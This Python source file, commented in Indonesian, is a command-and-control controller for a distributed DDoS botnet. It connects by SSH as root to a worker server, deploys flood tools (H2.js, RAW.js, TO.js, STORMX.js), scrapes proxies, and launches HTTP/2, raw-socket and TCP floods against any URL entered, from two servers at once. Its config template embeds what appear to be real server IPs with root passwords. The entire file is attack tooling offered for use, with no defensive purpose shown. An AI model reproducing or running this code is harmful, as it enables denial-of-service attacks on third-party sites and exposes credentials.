#!/usr/bin/env python3
"""
C2 Master Controller - IKUT MENYERANG
Berjalan di Server 1 (Master)
- Mengontrol worker di Server 2 via SSH
- Juga menjalankan serangan langsung dari Server 1
"""

import os
import sys
import json
import time
import threading
import paramiko
from datetime import datetime
import subprocess
import random
import signal
import traceback

# Load konfigurasi
def load_config():
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
        return config
    except FileNotFoundError:
        print("\033[91m[!] config.json tidak ditemukan!\033[0m")
        print("\033[93m[!] Membuat config.json template...\033[0m")
        
        template = {
            "server1": {
                "name": "MASTER-ATTACKER",
                "ip": "209.38.31.82",
                "port": 22,
                "username": "root",
                "password": "WYIIOFFC#4VCPU16GBAMD",
                "max_bots": 10000,
                "is_master": True,
                "attack_capable": True
            },
            "server2": {
                "name": "WORKER-ATTACKER",
                "ip": "134.199.174.157",
                "port": 22,
                "username": "root",
                "password": "WYIIOFFC#4VCPU16GBAMD",
                "max_bots": 10000,
                "is_master": False,
                "attack_capable": True
            },
            "security": {
                "api_key": "ruiix-c2",
                "admin_only": True
            },
            "attack": {
                "default_duration": 60,
                "default_threads": 100,
                "max_requests": 1000000,
                "distribute_load": True
            }
        }
        
        with open('config.json', 'w') as f:
            json.dump(template, f, indent=4)
        
        print("\033[92m[✓] config.json telah dibuat. Silakan edit password!\033[0m")
        sys.exit(0)
    except json.JSONDecodeError as e:
        print(f"\033[91m[!] Error parsing config.json: {e}\033[0m")
        sys.exit(1)

CONFIG = load_config()
SERVER1 = CONFIG['server1']  # Master (local) - IKUT MENYERANG
SERVER2 = CONFIG['server2']  # Worker (remote)
SECURITY = CONFIG['security']
ATTACK = CONFIG['attack']

class C2Controller:
    def __init__(self):
        self.servers = {
            'server1': {
                'config': SERVER1.copy(),
                'status': 'local',
                'tasks': [],
                'attack_capable': True
            },
            'server2': {
                'config': SERVER2.copy(),
                'status': 'unknown',
                'tasks': [],
                'attack_capable': True
            }
        }
        self.active_attacks = []
        self.local_processes = []  # Untuk proses lokal di server1
        self.api_key = SECURITY['api_key']
        self.running = True
        self.tools_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'tools')
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        banner = """
    ╔═══════════════════════════════════════════════════════════════════╗
    ║     ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗         ║
    ║     ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝         ║
    ║     ██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║            ║
    ║     ██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║            ║
    ║     ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║            ║
    ║     ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝            ║
    ║              C2 v9.0 - MASTER & WORKER ATTACK                      ║
    ║                                                                       ║
    ╚═══════════════════════════════════════════════════════════════════╝
        """
        print(f"\033[96m{banner}\033[0m")
        print(f"\033[93m[•] SERVER 1 (MASTER): {SERVER1['ip']} - IKUT MENYERANG!\033[0m")
        print(f"\033[93m[•] SERVER 2 (WORKER): {SERVER2['ip']}:{SERVER2['port']}\033[0m")
        print(f"\033[93m[•] Active Attacks: {len(self.active_attacks)} | API Key: {self.api_key[:8]}...\033[0m")
        print(f"\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
    
    def print_menu(self):
        menu = """
    \033[92m[01]\033[0m attack       - Mulai serangan DDoS (Master + Worker BERSAMA)
    \033[92m[02]\033[0m status       - Cek status semua server
    \033[92m[03]\033[0m deploy       - Deploy tools ke WORKER saja
    \033[92m[04]\033[0m proxy        - Update proxy di semua server
    \033[92m[05]\033[0m tasks        - Lihat task aktif di semua server
    \033[92m[06]\033[0m stop         - Hentikan serangan tertentu
    \033[92m[07]\033[0m stop_all     - Hentikan semua serangan di semua server
    \033[92m[08]\033[0m clear        - Bersihkan layar
    \033[92m[09]\033[0m exit         - Keluar dari C2
        """
        print(menu)
    
    def ssh_connect_to_server(self, server_name):
        """Koneksi SSH ke server remote"""
        server = self.servers[server_name]
        if server_name == 'server1':
            return None  # Server1 adalah lokal
            
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                server['config']['ip'],
                port=server['config']['port'],
                username=server['config']['username'],
                password=server['config']['password'],
                timeout=10,
                allow_agent=False,
                look_for_keys=False
            )
            return ssh
        except paramiko.AuthenticationException:
            print(f"\033[91m[!] SSH Authentication failed for {server_name}\033[0m")
            return None
        except Exception as e:
            print(f"\033[91m[!] SSH Error ke {server_name}: {e}\033[0m")
            return None
    
    def check_all_servers_status(self):
        """Cek status semua server"""
        print("\n\033[95m[•] Checking all servers status...\033[0m")
        
        # Cek server1 (lokal)
        print(f"\n\033[96m[•] Checking SERVER 1 (MASTER - LOCAL)...\033[0m")
        
        # Cek Node.js di lokal
        try:
            result = subprocess.run(['node', '--version'], capture_output=True, text=True, timeout=2)
            node_version = result.stdout.strip() if result.returncode == 0 else "Not installed"
            
            # Cek tools
            tools_exist = all(os.path.exists(os.path.join(self.tools_dir, t)) 
                             for t in ['H2.js', 'RAW.js', 'TO.js', 'STORMX.js', 'proxy.js'])
            
            # Cek proxy
            proxy_path = os.path.join(self.tools_dir, 'proxy.txt')
            proxy_count = 0
            if os.path.exists(proxy_path):
                with open(proxy_path, 'r') as f:
                    proxy_count = len(f.readlines())
            
            print(f"\033[92m  ✓ Status: Online (Local)\033[0m")
            print(f"\033[92m  ✓ Node.js: {node_version}\033[0m")
            print(f"\033[92m  ✓ Tools: {'Complete' if tools_exist else 'Incomplete'}\033[0m")
            print(f"\033[92m  ✓ Proxies: {proxy_count}\033[0m")
            
            self.servers['server1']['status'] = 'online'
            
        except Exception as e:
            print(f"\033[91m  ✗ Error checking local: {e}\033[0m")
            self.servers['server1']['status'] = 'error'
        
        # Cek server2 (remote)
        print(f"\n\033[96m[•] Checking SERVER 2 (WORKER - REMOTE)...\033[0m")
        ssh = self.ssh_connect_to_server('server2')
        if ssh:
            try:
                # Cek uptime
                stdin, stdout, stderr = ssh.exec_command("uptime 2>/dev/null || echo 'N/A'")
                uptime = stdout.read().decode().strip()
                
                # Cek worker python
                stdin, stdout, stderr = ssh.exec_command("ps aux | grep worker.py | grep -v grep")
                worker = stdout.read().decode().strip()
                
                # Cek proses attack Node.js
                stdin, stdout, stderr = ssh.exec_command("ps aux | grep -E 'H2.js|RAW.js|TO.js|STORMX.js' | grep -v grep | wc -l")
                attack_count = stdout.read().decode().strip() or "0"
                
                # Cek proxy file
                stdin, stdout, stderr = ssh.exec_command("cat /root/c2/tools/proxy.txt 2>/dev/null | wc -l")
                proxy_count = stdout.read().decode().strip() or "0"
                
                self.servers['server2']['status'] = 'online' if worker else 'no_worker'
                
                print(f"\033[92m  ✓ Connection: OK\033[0m")
                print(f"\033[92m  ✓ Worker: {'Running' if worker else 'Stopped'}\033[0m")
                print(f"\033[92m  ✓ Active Attacks: {attack_count}\033[0m")
                print(f"\033[92m  ✓ Proxies: {proxy_count.strip()}\033[0m")
                
                ssh.close()
            except Exception as e:
                self.servers['server2']['status'] = 'error'
                print(f"\033[91m  ✗ Error checking worker: {e}\033[0m")
        else:
            self.servers['server2']['status'] = 'offline'
            print(f"\033[91m  ✗ Worker Status: Offline\033[0m")
    
    def deploy_to_worker_only(self):
        """Deploy tools ke worker server saja (server2)"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Deploy ke WORKER server saja...\033[0m")
        print("\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        
        print(f"\n\033[96m[•] Deploying to worker ({SERVER2['ip']})...\033[0m")
        ssh = self.ssh_connect_to_server('server2')
        
        if ssh:
            try:
                # Buat direktori
                commands = [
                    "mkdir -p /root/c2/tools",
                    "mkdir -p /root/c2/logs",
                    "apt-get update -qq",
                    "apt-get install -y python3-pip nodejs npm screen -qq",
                    "pip3 install flask requests psutil -q",
                    "npm install -g axios http2 net --silent"
                ]
                
                for cmd in commands:
                    print(f"  Running: {cmd[:50]}...")
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    stdout.channel.recv_exit_status()
                
                # Upload worker.py
                print("  Uploading worker.py...")
                worker_path = os.path.join('tools', 'worker.py')
                if os.path.exists(worker_path):
                    with open(worker_path, 'r') as f:
                        worker_content = f.read()
                    
                    sftp = ssh.open_sftp()
                    with sftp.open('/root/c2/worker.py', 'w') as f:
                        f.write(worker_content)
                    sftp.close()
                else:
                    print(f"\033[91m  ✗ worker.py not found!\033[0m")
                
                # Upload Node.js tools
                print("  Uploading Node.js tools...")
                node_tools = ['H2.js', 'RAW.js', 'TO.js', 'STORMX.js', 'proxy.js']
                sftp = ssh.open_sftp()
                for tool in node_tools:
                    tool_path = os.path.join('tools', tool)
                    if os.path.exists(tool_path):
                        print(f"    Uploading {tool}...")
                        with open(tool_path, 'r') as f:
                            tool_content = f.read()
                        with sftp.open(f'/root/c2/tools/{tool}', 'w') as tf:
                            tf.write(tool_content)
                sftp.close()
                
                # Buat config.json di worker
                worker_config = {
                    'worker_name': 'WORKER-ATTACKER',
                    'worker_ip': SERVER2['ip'],
                    'worker_port': 5001,
                    'master_ip': SERVER1['ip'],
                    'master_port': 5000,
                    'api_key': SECURITY['api_key'],
                    'max_bots': SERVER2['max_bots']
                }
                
                config_json = json.dumps(worker_config, indent=4)
                stdin, stdout, stderr = ssh.exec_command(f"cat > /root/c2/config.json << 'EOF'\n{config_json}\nEOF")
                
                # Buat package.json
                package_json = {
                    "name": "c2-worker-tools",
                    "version": "1.0.0",
                    "dependencies": {
                        "axios": "^1.6.0",
                        "http2": "^3.3.7",
                        "https": "^1.0.0",
                        "net": "^1.0.2",
                        "tls": "^1.0.1",
                        "crypto": "^1.0.1"
                    }
                }
                
                package_str = json.dumps(package_json, indent=2)
                stdin, stdout, stderr = ssh.exec_command(f"cat > /root/c2/package.json << 'EOF'\n{package_str}\nEOF")
                
                # Install Node.js dependencies
                print("  Installing Node.js dependencies...")
                ssh.exec_command("cd /root/c2 && npm install --silent")
                
                # Jalankan worker
                print("  Starting worker...")
                ssh.exec_command("cd /root/c2 && pkill -f worker.py; screen -dmS worker python3 worker.py")
                
                # Cek apakah worker berjalan
                time.sleep(2)
                stdin, stdout, stderr = ssh.exec_command("ps aux | grep worker.py | grep -v grep")
                worker_check = stdout.read().decode().strip()
                
                if worker_check:
                    print(f"\033[92m  ✓ Worker is running\033[0m")
                else:
                    print(f"\033[93m  ⚠ Worker might not be running\033[0m")
                
                ssh.close()
                print(f"\033[92m  ✓ Deployment to worker complete!\033[0m")
                
            except Exception as e:
                print(f"\033[91m  ✗ Error: {e}\033[0m")
        else:
            print(f"\033[91m  ✗ Cannot connect to worker\033[0m")
        
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def update_proxy_on_all_servers(self):
        """Update proxy di semua server (lokal + remote)"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Update proxy di SEMUA server (Master + Worker)...\033[0m")
        
        # Cek apakah proxy.js ada
        proxy_js_path = os.path.join('tools', 'proxy.js')
        if not os.path.exists(proxy_js_path):
            print(f"\033[91m[!] {proxy_js_path} tidak ditemukan!\033[0m")
            input("\nEnter to back menu..")
            return
        
        # Jalankan proxy.js lokal
        print("\n\033[96m[•] Menjalankan proxy scraper di MASTER...\033[0m")
        
        try:
            # Jalankan proxy.js
            result = subprocess.run(['node', proxy_js_path], 
                                  capture_output=True, text=True, timeout=60, cwd=os.getcwd())
            
            # Tampilkan output
            if result.stdout:
                print(result.stdout)
            if result.stderr:
                print(f"\033[93m{result.stderr}\033[0m")
            
            # Cek proxy.txt di folder tools
            proxy_path = os.path.join('tools', 'proxy.txt')
            if not os.path.exists(proxy_path):
                print("\033[91m[!] Gagal mendapatkan proxy di tools/proxy.txt\033[0m")
                input("\nEnter to back menu..")
                return
            
            # Baca proxy
            with open(proxy_path, 'r') as f:
                proxy_data = f.read()
                proxy_lines = proxy_data.splitlines()
                print(f"\033[92m[✓] Total proxy di MASTER: {len(proxy_lines)}\033[0m")
            
            # Upload ke worker (server2)
            print(f"\n\033[96m[•] Uploading to WORKER...\033[0m")
            ssh = self.ssh_connect_to_server('server2')
            if ssh:
                try:
                    sftp = ssh.open_sftp()
                    
                    # Buat folder tools jika belum ada
                    try:
                        sftp.mkdir('/root/c2/tools')
                    except:
                        pass
                    
                    # Upload ke /root/c2/tools/proxy.txt
                    remote_path = '/root/c2/tools/proxy.txt'
                    with sftp.open(remote_path, 'w') as f:
                        f.write(proxy_data)
                    
                    # Juga simpan di root
                    try:
                        with sftp.open('/root/c2/proxy.txt', 'w') as f:
                            f.write(proxy_data)
                    except:
                        pass
                    
                    sftp.close()
                    ssh.close()
                    
                    print(f"\033[92m  ✓ Proxy uploaded to worker ({len(proxy_lines)} proxies)\033[0m")
                    
                except Exception as e:
                    print(f"\033[91m  ✗ Error uploading to worker: {e}\033[0m")
            
            print(f"\n\033[92m[✓] Proxy updated on ALL servers!\033[0m")
            
        except subprocess.TimeoutExpired:
            print("\033[91m[!] Proxy scraper timeout\033[0m")
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
        
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def start_attack_locally(self, method, url, duration, threads, rate, attack_id):
        """Mulai serangan dari server 1 (master) secara lokal"""
        print(f"\n\033[96m[•] Starting attack on MASTER (local)...\033[0m")
        
        try:
            # Pilih tool berdasarkan method
            pathproxy = "/root/c2/proxy.txt"
            
            if method == "H2":
                cmd = f"node {self.tools_dir}/H2.js {url} {duration} {rate} {threads} {pathproxy}"
            elif method == "RAW":
                cmd = f"node {self.tools_dir}/RAW.js {url} {duration} {rate} {threads} {pathproxy}"
            elif method == "TO":
                cmd = f"node {self.tools_dir}/TO.js {url} {duration} {threads} {rate} {pathproxy}"
            elif method == "STORMX":
                cmd = f"node {self.tools_dir}/STORMX.js {url} {duration} {threads} {rate} {pathproxy}"
            elif method == "ALL":
                rand_method = random.choice(['H2', 'RAW', 'TO', 'STORMX'])
                if rand_method == "H2":
                    cmd = f"node {self.tools_dir}/H2.js {url} {duration} {rate} {threads}"
                elif rand_method == "RAW":
                    cmd = f"node {self.tools_dir}/RAW.js {url} {duration} {threads}"
                elif rand_method == "TO":
                    cmd = f"node {self.tools_dir}/TO.js {url} {duration} {threads} {rate}"
                else:
                    cmd = f"node {self.tools_dir}/STORMX.js {url} {duration} {threads} {rate}"
            
            # Jalankan proses lokal
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=os.getcwd(),
                preexec_fn=os.setsid  # Buat process group baru
            )
            
            self.local_processes.append({
                'attack_id': attack_id,
                'process': process,
                'cmd': cmd
            })
            
            print(f"\033[92m  ✓ Local attack started (PID: {process.pid})\033[0m")
            return True
            
        except Exception as e:
            print(f"\033[91m  ✗ Error starting local attack: {e}\033[0m")
            return False
    
    def start_attack_on_worker(self, method, url, duration, threads, rate, attack_id):
        """Mulai serangan di worker via SSH"""
        print(f"\n\033[96m[•] Starting attack on WORKER (remote)...\033[0m")
        
        ssh = self.ssh_connect_to_server('server2')
        if ssh:
            try:
                # Pilih tool berdasarkan method
                if method == "H2":
                    cmd = f"cd /root/c2 && node --max-old-space-size=8124 tools/H2.js {url} {duration} {rate} {threads}"
                elif method == "RAW":
                    cmd = f"cd /root/c2 && node --max-old-space-size=8124 tools/RAW.js {url} {duration} {threads}"
                elif method == "TO":
                    cmd = f"cd /root/c2 && node --max-old-space-size=8124 tools/TO.js {url} {duration} {threads} {rate}"
                elif method == "STORMX":
                    cmd = f"cd /root/c2 && node tools/STORMX.js {url} {duration} {threads} {rate}"
                elif method == "ALL":
                    rand_method = random.choice(['H2', 'RAW', 'TO', 'STORMX'])
                    if rand_method == "H2":
                        cmd = f"cd /root/c2 && node tools/H2.js {url} {duration} {rate} {threads}"
                    elif rand_method == "RAW":
                        cmd = f"cd /root/c2 && node tools/RAW.js {url} {duration} {threads}"
                    elif rand_method == "TO":
                        cmd = f"cd /root/c2 && node tools/TO.js {url} {duration} {threads} {rate}"
                    else:
                        cmd = f"cd /root/c2 && node tools/STORMX.js {url} {duration} {threads} {rate}"
                
                # Jalankan di screen
                screen_name = f"attack_{attack_id}"
                screen_cmd = f"cd /root/c2 && screen -dmS {screen_name} {cmd}"
                stdin, stdout, stderr = ssh.exec_command(screen_cmd)
                
                ssh.close()
                print(f"\033[92m  ✓ Worker attack started\033[0m")
                return True
                
            except Exception as e:
                print(f"\033[91m  ✗ Error on worker: {e}\033[0m")
                return False
        else:
            print(f"\033[91m  ✗ Cannot connect to worker\033[0m")
            return False
    
    def start_distributed_attack(self, method, url, duration, threads, rate):
        """Mulai serangan terdistribusi dari master dan worker"""
        attack_id = f"ATTACK_{int(time.time())}"
        
        print(f"\n\033[92m[✓] Starting DISTRIBUTED ATTACK {attack_id}\033[0m")
        print(f"\033[92m[✓] Target: {url}\033[0m")
        print(f"\033[92m[✓] Duration: {duration} detik\033[0m")
        print(f"\033[92m[✓] Method: {method}\033[0m")
        print(f"\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        
        attack_info = {
            'id': attack_id,
            'method': method,
            'target': url,
            'duration': duration,
            'threads': threads,
            'rate': rate,
            'start_time': datetime.now().strftime("%H:%M:%S"),
            'servers': []
        }
        
        # Mulai dari master (server1)
        if self.start_attack_locally(method, url, duration, threads, rate, attack_id):
            attack_info['servers'].append({
                'name': 'MASTER',
                'status': 'running'
            })
        
        # Mulai dari worker (server2)
        if self.start_attack_on_worker(method, url, duration, threads, rate, attack_id):
            attack_info['servers'].append({
                'name': 'WORKER',
                'status': 'running'
            })
        
        if attack_info['servers']:
            self.active_attacks.append(attack_info)
            
            # Auto cleanup setelah durasi selesai
            def monitor_attack():
                time.sleep(int(duration))
                for attack in self.active_attacks[:]:
                    if attack['id'] == attack_id:
                        self.active_attacks.remove(attack)
                        print(f"\n\033[93m[⏱] Attack {attack_id} completed ({duration}s)\033[0m")
                        break
            
            monitor_thread = threading.Thread(target=monitor_attack)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            return True
        else:
            print(f"\033[91m[!] Attack failed: no servers available\033[0m")
            return False
    
    def start_attack(self):
        """Menu untuk memulai serangan"""
        self.clear_screen()
        self.print_banner()
        print("\033[95m[•] DISTRIBUTED ATTACK - Master + Worker BERSAMA\033[0m")
        print("\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        
        # Pilih metode
        print("\n\033[96mMetode Serangan:\033[0m")
        print("  [1] H2      - HTTP/2 Flood")
        print("  [2] RAW     - Raw Socket Flood")
        print("  [3] TO      - TCP OAST Flood")
        print("  [4] STORMX  - Storm Multilayer")
        print("  [5] ALL     - Semua metode (random per server)")
        
        try:
            method_choice = input("\n\033[93mPilih metode [1-5]:\033[0m ").strip()
            
            methods = {
                '1': 'H2',
                '2': 'RAW',
                '3': 'TO',
                '4': 'STORMX',
                '5': 'ALL'
            }
            
            if method_choice not in methods:
                print("\033[91m[!] Pilihan tidak valid\033[0m")
                time.sleep(1)
                return
            
            method = methods[method_choice]
            
            # Input target
            url = input("\033[93mURL Target:\033[0m ").strip()
            if not url:
                print("\033[91m[!] URL tidak boleh kosong\033[0m")
                time.sleep(1)
                return
                
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            # Input durasi
            durasi_input = input(f"\033[93mDurasi (detik) [default: {ATTACK['default_duration']}]:\033[0m ").strip()
            durasi = int(durasi_input) if durasi_input.isdigit() else ATTACK['default_duration']
            
            # Input threads per server
            threads_input = input(f"\033[93mThreads per server [default: {ATTACK['default_threads']}]:\033[0m ").strip()
            threads = int(threads_input) if threads_input.isdigit() else ATTACK['default_threads']
            
            # Input rate
            rate_input = input("\033[93mRate (requests/second) [default: 1000]:\033[0m ").strip()
            rate = int(rate_input) if rate_input.isdigit() else 1000
            
            print(f"\n\033[92m[✓] Distributed Attack Configuration:\033[0m")
            print(f"\033[92m  Method: {method}\033[0m")
            print(f"\033[92m  Target: {url}\033[0m")
            print(f"\033[92m  Duration: {durasi} detik\033[0m")
            print(f"\033[92m  Threads/server: {threads}\033[0m")
            print(f"\033[92m  Rate: {rate}\033[0m")
            print(f"\033[92m  Servers: MASTER (local) + WORKER (remote)\033[0m")
            
            confirm = input("\n\033[93mLanjutkan serangan? (y/n):\033[0m ").strip().lower()
            if confirm == 'y':
                self.start_distributed_attack(method, url, durasi, threads, rate)
            else:
                print("\033[93m[!] Dibatalkan\033[0m")
            
        except KeyboardInterrupt:
            print("\n\033[93m[!] Dibatalkan\033[0m")
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
        
        input("\n\033[93mTekan Enter untuk kembali ke menu...\033[0m")
    
    def show_all_tasks(self):
        """Tampilkan task yang berjalan di semua server"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Active Tasks on ALL Servers\033[0m")
        print("\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        
        if not self.active_attacks:
            print("\033[93m[!] Tidak ada serangan aktif\033[0m")
        else:
            for i, attack in enumerate(self.active_attacks, 1):
                # Hitung sisa waktu
                try:
                    start_time = datetime.strptime(attack['start_time'], "%H:%M:%S")
                    now = datetime.now()
                    elapsed = (now - start_time).seconds
                    remaining = max(0, int(attack['duration']) - elapsed)
                except:
                    remaining = "?"
                
                print(f"\n\033[96m[{i}] Attack ID: {attack['id']}\033[0m")
                print(f"  Method: {attack['method']}")
                print(f"  Target: {attack['target']}")
                print(f"  Duration: {attack['duration']} detik")
                print(f"  Remaining: {remaining} detik")
                print(f"  Servers: {', '.join([s['name'] for s in attack['servers']])}")
        
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def stop_specific_attack(self):
        """Hentikan serangan tertentu di semua server"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Stop Specific Attack\033[0m")
        print("\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        
        if not self.active_attacks:
            print("\033[93m[!] Tidak ada serangan aktif\033[0m")
            input("\nEnter to back menu..")
            return
        
        # Tampilkan daftar attack
        for i, attack in enumerate(self.active_attacks, 1):
            servers = ', '.join([s['name'] for s in attack['servers']])
            print(f"\033[96m[{i}] {attack['id']} - {attack['target']} ({attack['method']}) on {servers}\033[0m")
        
        try:
            choice = input("\n\033[93mPilih nomor attack [0 untuk batal]:\033[0m ").strip()
            
            if choice.isdigit() and 1 <= int(choice) <= len(self.active_attacks):
                attack = self.active_attacks[int(choice)-1]
                
                print(f"\n\033[96m[•] Menghentikan attack {attack['id']}...\033[0m")
                
                # Hentikan di master (local)
                for proc_info in self.local_processes[:]:
                    if proc_info['attack_id'] == attack['id']:
                        try:
                            os.killpg(os.getpgid(proc_info['process'].pid), signal.SIGTERM)
                            self.local_processes.remove(proc_info)
                            print(f"  \033[92m✓ Stopped on MASTER\033[0m")
                        except:
                            pass
                
                # Hentikan di worker
                ssh = self.ssh_connect_to_server('server2')
                if ssh:
                    try:
                        ssh.exec_command("pkill -f H2.js; pkill -f RAW.js; pkill -f TO.js; pkill -f STORMX.js")
                        ssh.exec_command(f"screen -ls | grep {attack['id']} | cut -d. -f1 | xargs -r kill")
                        print(f"  \033[92m✓ Stopped on WORKER\033[0m")
                        ssh.close()
                    except:
                        pass
                
                self.active_attacks.remove(attack)
                print(f"\n\033[92m[✓] Attack dihentikan\033[0m")
            else:
                print("\033[91m[!] Dibatalkan\033[0m")
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
        
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def stop_all_attacks(self):
        """Hentikan semua serangan di semua server"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Menghentikan SEMUA serangan di ALL servers...\033[0m")
        
        # Hentikan di master (local)
        print(f"\n\033[96m[•] Stopping on MASTER...\033[0m")
        for proc_info in self.local_processes:
            try:
                os.killpg(os.getpgid(proc_info['process'].pid), signal.SIGKILL)
            except:
                pass
        self.local_processes.clear()
        print(f"\033[92m  ✓ Local attacks stopped\033[0m")
        
        # Hentikan di worker
        print(f"\n\033[96m[•] Stopping on WORKER...\033[0m")
        ssh = self.ssh_connect_to_server('server2')
        if ssh:
            try:
                ssh.exec_command("pkill -f H2.js; pkill -f RAW.js; pkill -f TO.js; pkill -f STORMX.js")
                ssh.exec_command("screen -ls | grep attack | cut -d. -f1 | xargs -r kill")
                print(f"\033[92m  ✓ Worker attacks stopped\033[0m")
                ssh.close()
            except Exception as e:
                print(f"\033[91m  ✗ Error on worker: {e}\033[0m")
        
        self.active_attacks.clear()
        print(f"\n\033[92m[✓] SEMUA serangan telah dihentikan!\033[0m")
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def run(self):
        """Main loop"""
        while self.running:
            try:
                self.clear_screen()
                self.print_banner()
                self.print_menu()
                
                choice = input("\033[91m\033[47mruiix@[C2-MASTER]>\033[0m ").strip().lower()
                
                if choice in ["1", "attack"]:
                    self.start_attack()
                elif choice in ["2", "status"]:
                    self.check_all_servers_status()
                    input("\n\033[93mEnter to back menu..\033[0m")
                elif choice in ["3", "deploy"]:
                    self.deploy_to_worker_only()
                elif choice in ["4", "proxy"]:
                    self.update_proxy_on_all_servers()
                elif choice in ["5", "tasks"]:
                    self.show_all_tasks()
                elif choice in ["6", "stop"]:
                    self.stop_specific_attack()
                elif choice in ["7", "stop_all"]:
                    self.stop_all_attacks()
                elif choice in ["8", "clear"]:
                    continue
                elif choice in ["9", "exit", "quit"]:
                    print("\033[91m[!] Keluar dari C2...\033[0m")
                    if self.active_attacks:
                        stop = input("Hentikan semua serangan sebelum keluar? (y/n): ").strip().lower()
                        if stop == 'y':
                            self.stop_all_attacks()
                    self.running = False
                else:
                    print("\033[91m[!] Pilihan tidak valid!\033[0m")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print("\n\033[93m[!] Press Ctrl+C again to exit\033[0m")
                try:
                    time.sleep(1)
                except KeyboardInterrupt:
                    print("\n\033[91m[!] Force exit\033[0m")
                    self.running = False
            except Exception as e:
                print(f"\033[91m[!] Unexpected error: {e}\033[0m")
                traceback.print_exc()
                time.sleep(3)

if __name__ == "__main__":
    # Cek dependencies
    try:
        import paramiko
    except ImportError:
        print("\033[93m[!] Installing paramiko...\033[0m")
        os.system("pip3 install paramiko")
        import paramiko
    
    # Jalankan controller
    controller = C2Controller()
    try:
        controller.run()
    except KeyboardInterrupt:
        print("\n\033[91m[!] C2 terminated\033[0m")
        sys.exit(0)